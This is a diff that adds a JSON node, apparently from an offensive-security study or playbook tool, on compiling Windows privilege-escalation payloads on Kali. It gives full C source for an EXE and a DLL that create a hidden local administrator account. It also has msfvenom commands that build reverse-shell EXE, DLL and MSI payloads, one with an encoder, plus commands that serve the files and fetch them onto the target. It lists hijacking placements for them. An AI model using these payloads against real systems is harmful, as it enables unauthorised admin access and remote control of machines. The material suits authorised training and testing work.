@@ -1,0 +1,26 @@
+{
+  "id": "win_compile",
+  "phase": "WINDOWS",
+  "title": "Windows Payload Compilation (Kali)",
+  "body": "Cross-compile Windows binaries and DLLs on Kali with mingw. Module 17.2: adduser.c is the go-to for service binary hijacking, DLL hijacking, scheduled task abuse, and unquoted paths.",
+  "cmd": "# ── INSTALL MINGW ────────────────────────────────────\nsudo apt install mingw-w64 -y\n\n# ── ADDUSER.C — add admin user ───────────────────────\n# Save as adduser.c:\n# #include <stdlib.h>\n# int main() {\n#   int i;\n#   i = system(\"net user dave2 password123! /add\");\n#   i = system(\"net localgroup administrators dave2 /add\");\n#   return 0;\n# }\n\n# Compile 64-bit EXE:\nx86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n\n# Compile 32-bit EXE:\ni686-w64-mingw32-gcc adduser.c -o adduser32.exe\n\n# ── ADDUSER DLL — for DLL hijacking ──────────────────\n# Save as adduser.cpp:\n# #include <stdlib.h>\n# #include <windows.h>\n# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {\n#   switch(reason) {\n#     case DLL_PROCESS_ATTACH:\n#       system(\"net user dave3 password123! /add\");\n#       system(\"net localgroup administrators dave3 /add\");\n#       break;\n#   }\n#   return TRUE;\n# }\n\n# Compile 64-bit DLL:\nx86_64-w64-mingw32-gcc adduser.cpp --shared -o TextShaping.dll\n\n# ── REVERSE SHELL EXE ────────────────────────────────\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -e x86/shikata_ga_nai -o shell_enc.exe\n\n# ── REVERSE SHELL DLL ────────────────────────────────\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o shell.dll\n\n# ── MSI (AlwaysInstallElevated) ──────────────────────\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi\n\n# ── SERVE AND TRANSFER ───────────────────────────────\npython3 -m http.server 80\n# On Windows:\niwr http://$lhost/adduser.exe -OutFile C:\\Windows\\Temp\\adduser.exe\nUnblock-File C:\\Windows\\Temp\\adduser.exe\n\n# ── USE CASES ────────────────────────────────────────\n# Service binary hijacking  -> adduser.exe replaces mysqld.exe\n# DLL hijacking             -> adduser.dll renamed to missing DLL\n# Unquoted service path     -> adduser.exe renamed to Current.exe\n# Scheduled task            -> adduser.exe replaces task binary\n# All of the above          -> same C code, different placement",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Service binary hijacking",
+      "next": "weak_service"
+    },
+    {
+      "label": "DLL hijacking",
+      "next": "win_dll_hijack"
+    },
+    {
+      "label": "Unquoted service path",
+      "next": "unquoted_service"
+    },
+    {
+      "label": "Scheduled task abuse",
+      "next": "scheduled_tasks_win"
+    }
+  ]
+}
